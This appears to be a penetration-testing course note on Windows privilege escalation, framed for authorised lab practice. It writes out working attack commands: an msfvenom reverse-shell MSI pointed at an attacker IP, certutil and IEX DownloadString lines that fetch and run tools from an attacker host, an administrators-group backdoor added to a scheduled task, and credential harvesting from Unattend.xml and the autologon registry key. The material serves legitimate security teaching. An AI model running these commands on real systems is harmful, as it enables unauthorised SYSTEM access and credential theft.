### Windows Privilege Escalation

--> ⚠️ LEGAL / ETHICAL REMINDER: Everything below assumes you already have a low-privileged foothold session on a target you own or have explicit written permission to test (Metasploitable3, TryHackMe/HackTheBox Windows lab machines, your own AD/Windows lab VMs). These techniques give full SYSTEM/Administrator control — practicing them anywhere else is unauthorized access.

--> Windows privilege escalation follows the same core mindset as note 08's Linux version — enumerate exhaustively, find a misconfiguration, exploit it, verify — but the specific mechanisms are entirely Windows-native: services, registry keys, tokens, scheduled tasks, and stored credential artifacts left behind by admin tooling.

## The Windows Privesc Mindset

--> A repeatable manual enumeration checklist on any fresh Windows foothold (cmd.exe or PowerShell):
```powershell
whoami /all                          # current user, groups, AND privileges (the /priv section matters enormously - see token impersonation below)
systeminfo                            # OS build, patch level - feeds kernel/MS-CVE exploit search
hostname
net user                              # local user accounts
net localgroup administrators          # who's already an admin - useful context, and a target list if you can add yourself
whoami /priv                          # privilege list e.g. SeImpersonatePrivilege, SeBackupPrivilege - each maps to known abuse techniques
wmic service list brief                # installed services
schtasks /query /fo LIST /v            # scheduled tasks with full detail
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall   # installed software - version info for CVE lookup
```
--> The "privilege" list from `whoami /priv` is one of the most underrated enumeration steps — certain named privileges (not just group membership) directly enable specific escalation techniques, most famously `SeImpersonatePrivilege` (covered under token impersonation below).

## Unquoted Service Paths

--> When a Windows service's binary path contains a SPACE and is NOT wrapped in quotes, Windows tries each space-delimited segment in order as a possible executable, working left to right, before falling back to the full intended path.
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
```
```text
VulnService  Vulnerable Service  C:\Program Files\My App\service.exe  Auto
```
--> Because this path is unquoted, Windows will actually try to execute, in order: `C:\Program.exe`, then `C:\Program Files\My.exe`, then finally `C:\Program Files\My App\service.exe`. If you have write access to `C:\` or `C:\Program Files\` (misconfigured permissions, or a non-default install location under a writable directory), you can drop a malicious `Program.exe` and it runs INSTEAD of the real service binary — as whatever account the service runs as (often `LocalSystem`).
```powershell
icacls "C:\Program Files"                       # check write permissions on each path segment
copy malicious.exe "C:\Program.exe"              # plant the payload at the first-checked path segment
sc stop VulnService
sc start VulnService                              # or wait for a scheduled restart / reboot
```
--> Finding these automatically:
```powershell
wmic service get name,pathname,startmode | findstr /i /v """  # crude filter for paths lacking quotes
```

## Weak Service Permissions (Modifiable Service Binaries/Config)

--> Even with a properly quoted path, if the SERVICE BINARY ITSELF (or the service's registry configuration) is writable by your low-priv user, you can replace it directly or reconfigure what it launches.
```powershell
icacls "C:\Program Files\My App\service.exe"      # check if your user has Write/Modify/FullControl on the binary
```
```text
BUILTIN\Users:(M)     # (M) = Modify - this is the finding, standard users should not be able to modify service binaries
```
```powershell
copy /y malicious.exe "C:\Program Files\My App\service.exe"
sc stop VulnService & sc start VulnService
```
--> Alternatively, check whether you have permission to reconfigure the SERVICE OBJECT itself (not the binary file) via `sc` — some misconfigurations grant `SERVICE_CHANGE_CONFIG` to low-priv users on the service's ACL directly:
```powershell
accesschk.exe /accepteula -uwcqv "Authenticated Users" *    # Sysinternals accesschk - list services modifiable by that group
sc config VulnService binpath= "C:\temp\malicious.exe"
sc stop VulnService & sc start VulnService
```
--> Both cases result in your payload executing with whatever account the service runs as — check `sc qc VulnService` for the `SERVICE_START_NAME` field to confirm it's `LocalSystem` before investing effort.

## AlwaysInstallElevated Registry Key Abuse

--> Two registry values, if BOTH set to `1`, tell Windows to install ANY `.msi` package with elevated (SYSTEM) privileges regardless of who launches it — a deliberate but frequently mis-enabled convenience setting for unattended software deployment.
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
```text
HKLM\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
HKCU\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
--> If both keys return `0x1`, craft a malicious MSI and run it — it installs with SYSTEM privileges no matter your current permission level.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o evil.msi
```
```powershell
msiexec /quiet /qn /i evil.msi        # runs silently, elevated, triggers the reverse shell back to your listener
```
--> Metasploit's `exploit/windows/local/always_install_elevated` module automates this end-to-end from an existing session, including generating and delivering the MSI.

## Insecure Stored Credentials

==> unattended.xml / sysprep Leftovers
--> Windows deployment via Sysprep/unattended installation can leave `Unattend.xml` (or `sysprep.inf` on older systems) on disk, sometimes containing a plaintext or Base64-encoded local admin password set during automated provisioning and never cleaned up.
```powershell
dir /s /b C:\Unattend.xml
dir /s /b C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend.xml
```
```xml
<Password>
    <Value>QQBkAG0AaQBuADEAMgAzACEAAAA=</Value>
    <PlainText>false</PlainText>
</Password>
```
--> That `Value` is UTF-16LE Base64 (a Windows-specific encoding quirk for these files), decode with:
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("QQBkAG0AaQBuADEAMgAzACEAAAA="))
```

==> Registry Autologon Credentials
--> Some machines are configured for automatic login (no password prompt at boot) — the plaintext password for this is stored directly in the registry.
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
```text
DefaultUserName    REG_SZ    Administrator
DefaultPassword    REG_SZ    P@ssw0rd123!
```
--> An immediate, directly-usable credential if present — always check this key early, it costs one command.

==> Other Common Locations Worth a Quick Sweep
```powershell
findstr /si password *.xml *.ini *.txt *.config     # search common config/text file types for the literal word "password"
dir /s *pass* == *cred* *.config *.xml *.txt 2>nul    # search filenames themselves for credential-suggestive names
Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue   # KeePass database files
```
--> Saved RDP credentials, browser-saved passwords, and PuTTY saved sessions (`reg query HKCU\Software\SimonTatham\PuTTY\Sessions`) are all worth checking on any admin-used workstation.

## Token Impersonation

--> Windows access tokens represent a user's security context; certain PRIVILEGES (visible in `whoami /priv`) allow a process to IMPERSONATE the token of another, more privileged process/user without knowing their password at all.
```text
whoami /priv
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
SeAssignPrimaryTokenPrivilege    Replace a process level token    Enabled
```
--> `SeImpersonatePrivilege` enabled on a low-privileged account (very common on service accounts running IIS app pools, SQL Server, or other Windows services — these need it for their normal legitimate function) is the single flag that opens the door to the "Potato family" of exploits.

==> The Potato-Family Exploits (Conceptual Overview)
--> Conceptually, every Potato variant follows the same shape: trick a SYSTEM-level Windows component (a COM/RPC service, the print spooler, NTLM authentication over a local loopback listener) into authenticating to a listener YOU control, capture that SYSTEM-context token, then use `SeImpersonatePrivilege` to impersonate it and spawn a process running as SYSTEM.
1. RottenPotato — an early variant, abused COM server marshaling and NTLM relay over a local RPC call to coerce a SYSTEM authentication.
2. JuicyPotato — a widely-used successor, abused specific COM server CLSIDs (varies per Windows version, requires a matching CLSID list) to trigger the same SYSTEM authentication, then impersonated the resulting token. Patched/mitigated on newer Windows builds as Microsoft closed off several of the abused CLSIDs.
3. PrintSpoofer / RoguePotato — modern variants that don't depend on the same COM CLSID trick, instead abusing the Print Spooler service's named-pipe behavior (PrintSpoofer) or a more generic NTLM relay setup (RoguePotato) to achieve the same effect — these are the ones still commonly effective on modern patched Windows Server versions, PROVIDED `SeImpersonatePrivilege` is present.
```powershell
# PrintSpoofer usage pattern (run from a shell already possessing SeImpersonatePrivilege)
PrintSpoofer64.exe -i -c cmd
# -i = interactive, -c = command to spawn once impersonation succeeds - drops you into a SYSTEM cmd.exe
```
--> The practical takeaway, without needing to reimplement the exploit code yourself: whenever `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`) as `Enabled` on an account that is NOT already SYSTEM/Administrator, that is a near-guaranteed path to full SYSTEM via one of these publicly available tools — check the exact Windows build against each tool's known-working version range first.

## Scheduled Task Abuse

--> Analogous to note 08's cron hijacking on Linux — a scheduled task running as SYSTEM/Administrator that points at a script or binary writable by your current low-priv user is directly exploitable.
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run Task To Run"
```
```text
TaskName:  \VulnBackupTask
Task To Run: C:\Scripts\backup.ps1
Run As User: SYSTEM
```
```powershell
icacls C:\Scripts\backup.ps1     # check if your user can write to the referenced script
```
```text
BUILTIN\Users:(M)
```
--> If writable, append/replace the script content with a payload and wait for the task's trigger (or manually trigger it if permitted):
```powershell
Add-Content C:\Scripts\backup.ps1 "`nStart-Process cmd -ArgumentList '/c net localgroup administrators youruser /add'"
schtasks /run /tn "\VulnBackupTask"     # manually fire the task now, if your account has permission to do so
```
--> Also check the FOLDER holding the script, not just the file — if the directory itself is writable and the file is not, you can often delete/recreate the file entirely (depending on ACL inheritance) to the same effect.

## Automation Tools

==> WinPEAS
```powershell
# transfer winPEASx64.exe to the target (SMB share, python http.server + certutil/iwr, etc.)
certutil -urlcache -split -f http://<attacker_ip>:8000/winPEASx64.exe winpeas.exe
.\winpeas.exe | Out-File -FilePath C:\Users\Public\winpeas_output.txt
```
--> How to read WinPEAS output: like LinPEAS, it's colour-coded by severity/interest — red/bold entries are near-certain findings (AlwaysInstallElevated set, unquoted+writable service path, stored credentials found, dangerous privileges enabled). It's organized in clear sections matching almost exactly the categories in this note (services, registry, scheduled tasks, credentials, tokens) — use it to CONFIRM candidates your manual `whoami /priv` + `icacls` checklist already flagged, not as a replacement for understanding WHY each finding matters.

==> PowerUp (PowerSploit)
```powershell
# Load PowerUp.ps1 into memory (Import-Module works too if the file is on disk)
IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8000/PowerUp.ps1')
Invoke-AllChecks
```
--> `Invoke-AllChecks` runs every individual PowerUp check (service permissions, unquoted paths, AlwaysInstallElevated, modifiable scheduled tasks, DLL hijacking opportunities) in one pass and prints an `AbuseFunction` field alongside each finding — literally the exact PowerShell command/cmdlet to run next to exploit it, which is the fastest way to go from "found a misconfiguration" to "have a SYSTEM shell".
```text
ServiceName   : VulnService
Path          : C:\Program Files\My App\service.exe
AbuseFunction : Write-ServiceBinary -Name 'VulnService' -Path <HijackPath>
```
--> Individual checks can also be run standalone when you already know what you're looking for: `Get-ModifiableServiceFile`, `Get-UnquotedService`, `Get-RegistryAlwaysInstallElevated`, `Get-ModifiableScheduledTaskFile`.

## Putting It Together

--> A practical order of operations on a fresh Windows foothold: run `whoami /priv` first (cheap, and an enabled `SeImpersonatePrivilege` is often an instant win via PrintSpoofer), then kick off WinPEAS/PowerUp in the background while you manually check services (`icacls` on any wmic-listed path), registry (`AlwaysInstallElevated`, autologon), and scheduled tasks in parallel — cross-reference the automated tool's findings against your manual checks rather than trusting either exclusively.

--> This mirrors note 08's Linux privesc structure exactly (same mindset, different mechanisms) and, together, both notes complete the "Gaining Access → Privilege Escalation" arc referenced back in note 05's Metasploit workflow and note 01's overall methodology.
